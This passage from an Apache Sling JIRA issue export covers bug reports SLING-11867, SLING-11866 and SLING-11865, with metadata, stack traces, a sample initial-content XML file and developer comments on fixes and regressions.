                            <comment id="17721647" author="sseifert@pro-vision.de" created="Thu, 11 May 2023 06:59:23 +0000"  >&lt;p&gt;this will be fixed alongside the PR &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-jcr-mock/pull/21&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-jcr-mock/pull/21&lt;/a&gt; for &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11869&quot; title=&quot;MockUserManager should load and save home folder items&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11869&quot;&gt;&lt;del&gt;SLING-11869&lt;/del&gt;&lt;/a&gt; which eliminates the code line using java.nio.file.Paths&lt;/p&gt;</comment>
                            <comment id="17722032" author="sseifert@pro-vision.de" created="Fri, 12 May 2023 06:52:32 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-jcr-mock/commit/ea08010516b8827430487adf3010976f3d1ac5cd&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-jcr-mock/commit/ea08010516b8827430487adf3010976f3d1ac5cd&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13535703">SLING-11869</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 23 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hso8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11867] Empty mapping from ResourceMapper breaks authentication requirement updates</title>
                <link>https://issues.apache.org/jira/browse/SLING-11867</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When a resource has a path less url as vanity path (eg: &quot;http://www.example.com&quot;) ResourceMapper.getAllMappings returns mappings consisting of an empty path &quot;&quot;.&lt;/p&gt;

&lt;p&gt;This &quot;&quot; mapping can make &lt;tt&gt;AuthenticationRequirementsManager&lt;/tt&gt; stop listening to further  authentication requirements &lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt;:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-xml&quot;&gt;
Exception in thread &lt;span class=&quot;code-quote&quot;&gt;&quot;pool-14-thread-1&quot;&lt;/span&gt; java.lang.IllegalArgumentException: Configuration must not be null or empty
	at org.apache.sling.auth.core.impl.AuthenticationRequirementHolder.fromConfig(AuthenticationRequirementHolder.java:30)
	at org.apache.sling.auth.core.impl.AuthenticationRequirementsManager.addService(AuthenticationRequirementsManager.java:374)
	at org.apache.sling.auth.core.impl.AuthenticationRequirementsManager.process(AuthenticationRequirementsManager.java:300)
	at org.apache.sling.auth.core.impl.AuthenticationRequirementsManager.processQueue(AuthenticationRequirementsManager.java:281)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at java.base/java.lang.Thread.run(Thread.java:834)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11861&quot; title=&quot; ResourceMapper.getAllMappings returns empty mapping &amp;quot;&amp;quot; when a vanity paths is pathless url&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11861&quot;&gt;&lt;del&gt;SLING-11861&lt;/del&gt;&lt;/a&gt; and &lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt;, it was suggested to make changes in caller&apos;s code instead of changing the behaviour of ResoucreMapper.&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;error&quot;&gt;&amp;#91;0&amp;#93;&lt;/span&gt;: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/96&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/96&lt;/a&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13535591">SLING-11867</key>
            <summary>Empty mapping from ResourceMapper breaks authentication requirement updates</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="sagarmiglani">Sagar Miglani</reporter>
                        <labels>
                    </labels>
                <created>Wed, 10 May 2023 05:43:46 +0000</created>
                <updated>Sun, 23 Jul 2023 07:26:54 +0000</updated>
                            <resolved>Wed, 17 May 2023 06:12:56 +0000</resolved>
                                    <version>Auth Core 1.6.0</version>
                                    <fixVersion>Auth Core 1.6.2</fixVersion>
                                    <component>Authentication</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                                                                                <comments>
                            <comment id="17722071" author="cziegeler" created="Fri, 12 May 2023 08:42:58 +0000"  >&lt;p&gt;There are two options to fix this issue, one is to change the path logic as done in the provided PR; the other one is to just ignore empty/null values in&#160;AuthenticationRequirementHolder.fromConfig&lt;br/&gt;
I have the feeling we should do the latter; this would also avoid breaking the system with an accidental empty configuration.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13535106">SLING-11861</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 23 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hsk0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11866] WebconsoleConfigurationHandler does not filter out default values coming from ConfigTaskCreator.getDefaultProperties </title>
                <link>https://issues.apache.org/jira/browse/SLING-11866</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Although &lt;tt&gt;MetatypeHandler.updateConfiguration&lt;/tt&gt; takes the default configurations identified via &lt;tt&gt;ConfigTaskCreator.getDefaultProperties(...)&lt;/tt&gt; as fourth argument it will never strip those properties from the props to update. Therefore &lt;tt&gt;WebconsoleConfigurationHandler.updateConfiguration(...)&lt;/tt&gt; will only ever strip properties which have&lt;br/&gt;
a) a default which is equal to the value to be set and&lt;br/&gt;
b) which are not contained in &lt;tt&gt;ConfigTaskCreator.getDefaultProperties(...)&lt;/tt&gt;&lt;/p&gt;


&lt;p&gt;b) just seem to be wrong as the logic should rather be:&lt;br/&gt;
strip all properties whose value is either equal to the metatype default value or the default value coming from the same named property of the the configuration provided by any of the MERGE_SCHEME configs.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13535405">SLING-11866</key>
            <summary>WebconsoleConfigurationHandler does not filter out default values coming from ConfigTaskCreator.getDefaultProperties </summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="6">Invalid</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Mon, 8 May 2023 17:56:08 +0000</created>
                <updated>Fri, 12 May 2023 07:18:04 +0000</updated>
                            <resolved>Fri, 12 May 2023 07:17:34 +0000</resolved>
                                    <version>Installer Configuration Factory 1.4.2</version>
                                                    <component>Installer</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17722044" author="kwin" created="Fri, 12 May 2023 07:17:34 +0000"  >&lt;p&gt;As clarified in &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-10771&quot; title=&quot;Support handling of metatype info when merging configurations&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-10771&quot;&gt;&lt;del&gt;SLING-10771&lt;/del&gt;&lt;/a&gt; the merged configurations are orthogonal and not supposed to be filtered in this SPI.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                                                <inwardlinks description="is caused by">
                                        <issuelink>
            <issuekey id="13398631">SLING-10771</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 23 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hrew:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11865] Conversion fails when initial content document does not include namespace declaration</title>
                <link>https://issues.apache.org/jira/browse/SLING-11865</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;I tried upgrading the AEM Analyser project to version 1.3.2 of the CP Converter, but that detected a regression ( see &lt;a href=&quot;https://github.com/adobe/aemanalyser-maven-plugin/pull/205&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/adobe/aemanalyser-maven-plugin/pull/205&lt;/a&gt; ). The failure message is&lt;/p&gt;

&lt;p&gt;&amp;gt; Failed to execute goal com.adobe.aem:aemanalyser-maven-plugin:1.5.9-SNAPSHOT:project-analyse (aem-analyser) on project aemanalyser-maven-plugin-it-content-package-files-test: Content Package Converter Exception Can not convert /tmp/cp2fm-converter16836453237918368470/SLING-INF/apps/my-first-node.xml to enhanced DocView format: javax.jcr.NamespaceException: No URI for prefix &apos;cq&apos; declared. -&amp;gt; &lt;span class=&quot;error&quot;&gt;&amp;#91;Help 1&amp;#93;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;The file, as extracted from the bundle, is&lt;/p&gt;

&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-xml&quot;&gt;
&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;?xml version=&lt;span class=&quot;code-quote&quot;&gt;&quot;1.0&quot;&lt;/span&gt; encoding=&lt;span class=&quot;code-quote&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt; ?&amp;gt;&lt;/span&gt;
&amp;lt;!--
  Licensed to the Apache Software Foundation (ASF) under one
  or more contributor license agreements.  See the NOTICE file
  distributed with this work for additional information
  regarding copyright ownership.  The ASF licenses this file
  to you under the Apache License, Version 2.0 (the
  &lt;span class=&quot;code-quote&quot;&gt;&quot;License&quot;&lt;/span&gt;); you may not use this file except in compliance
  with the License.  You may obtain a copy of the License at
   http://www.apache.org/licenses/LICENSE-2.0
  Unless required by applicable law or agreed to in writing,
  software distributed under the License is distributed on an
  &lt;span class=&quot;code-quote&quot;&gt;&quot;AS IS&quot;&lt;/span&gt; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
  KIND, either express or implied.  See the License for the
  specific language governing permissions and limitations
  under the License.
 --&amp;gt;
&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;node&amp;gt;&lt;/span&gt;
    &amp;lt;!--
      You can find out more documentation on this topic
      by following these links:
        -  http://sling.apache.org/site/content-loading.html
        -  http://jackrabbit.apache.org/node-type-notation.html
     --&amp;gt;
    &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;primaryNodeType&amp;gt;&lt;/span&gt;nt:unstructured&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/primaryNodeType&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;property&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;title&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;type&amp;gt;&lt;/span&gt;String&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/type&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;My first node&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/property&amp;gt;&lt;/span&gt;

    &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;property&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;description&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;type&amp;gt;&lt;/span&gt;String&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/type&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;This node has been created by a sling bundle.&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/property&amp;gt;&lt;/span&gt;
    
    &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;node&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;cq:EditConfig&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;primaryNodeType&amp;gt;&lt;/span&gt;cq:EditConfig&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/primaryNodeType&amp;gt;&lt;/span&gt;

        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;property&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;description&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;type&amp;gt;&lt;/span&gt;String&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/type&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;Some dummy data from sling initial content.&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/property&amp;gt;&lt;/span&gt;
        
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;node&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;cq:listeners&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;primaryNodeType&amp;gt;&lt;/span&gt;cq:EditListenersConfig&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/primaryNodeType&amp;gt;&lt;/span&gt;

            &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;property&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;description&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;type&amp;gt;&lt;/span&gt;String&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/type&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;Some dummy data from sling initial content.&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/property&amp;gt;&lt;/span&gt;
            
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/node&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/node&amp;gt;&lt;/span&gt;
    
    &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;node&amp;gt;&lt;/span&gt;
        
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;graniteComponent&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;mixinNodeType&amp;gt;&lt;/span&gt;granite:Component&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/mixinNodeType&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;primaryNodeType&amp;gt;&lt;/span&gt;sling:Folder&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/primaryNodeType&amp;gt;&lt;/span&gt;

        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;node&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;granite:data&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;primaryNodeType&amp;gt;&lt;/span&gt;nt:unstructured&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/primaryNodeType&amp;gt;&lt;/span&gt;

            &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;property&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;description&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;type&amp;gt;&lt;/span&gt;String&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/type&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;Some dummy data from sling initial content.&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/property&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/node&amp;gt;&lt;/span&gt;

        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;node&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;my:subnode&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;primaryNodeType&amp;gt;&lt;/span&gt;nt:unstructured&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/primaryNodeType&amp;gt;&lt;/span&gt;

            &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;property&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;description&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;type&amp;gt;&lt;/span&gt;String&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/type&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;value&amp;gt;&lt;/span&gt;Some dummy data from sling initial content.&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/value&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/property&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/node&amp;gt;&lt;/span&gt;
        
    &lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/node&amp;gt;&lt;/span&gt;
   

&lt;span class=&quot;code-tag&quot;&gt;&amp;lt;/node&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13535376">SLING-11865</key>
            <summary>Conversion fails when initial content document does not include namespace declaration</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="2" iconUrl="https://issues.apache.org/jira/images/icons/priorities/critical.svg">Critical</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="2">Won&apos;t Fix</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Mon, 8 May 2023 13:11:04 +0000</created>
                <updated>Fri, 8 Nov 2024 13:41:08 +0000</updated>
                            <resolved>Fri, 12 May 2023 15:42:28 +0000</resolved>
                                    <version>Content-Package to Feature Model Converter 1.3.2</version>
                                                    <component>Content-Package to Feature Model Converter</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>4</watches>
                                                                                                                <comments>
                            <comment id="17720503" author="rombert" created="Mon, 8 May 2023 13:15:01 +0000"  >&lt;p&gt;The build succeeed after I reverted &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/commit/084e751fb5c170eeee9b701ceee9cee1cfb27aac&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;commit 084e751fb5c170eeee9b701ceee9cee1cfb27aac&lt;/a&gt;, so this is caused by &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11421&quot; title=&quot;Use DocView serialisation classes from FileVault&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11421&quot;&gt;&lt;del&gt;SLING-11421&lt;/del&gt;&lt;/a&gt; .&lt;/p&gt;

&lt;p&gt;The content package used for the conversion is at &lt;a href=&quot;https://github.com/adobe/aemanalyser-maven-plugin/tree/main/aemanalyser-maven-plugin/src/it/sling-initial-content-packages-test/files&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/adobe/aemanalyser-maven-plugin/tree/main/aemanalyser-maven-plugin/src/it/sling-initial-content-packages-test/files&lt;/a&gt;  .&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt;, &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt; - I am not familiar with Sling-Initial-Content, but this looks like a regression to me. Any ideas on how to fix this?&lt;/p&gt;</comment>
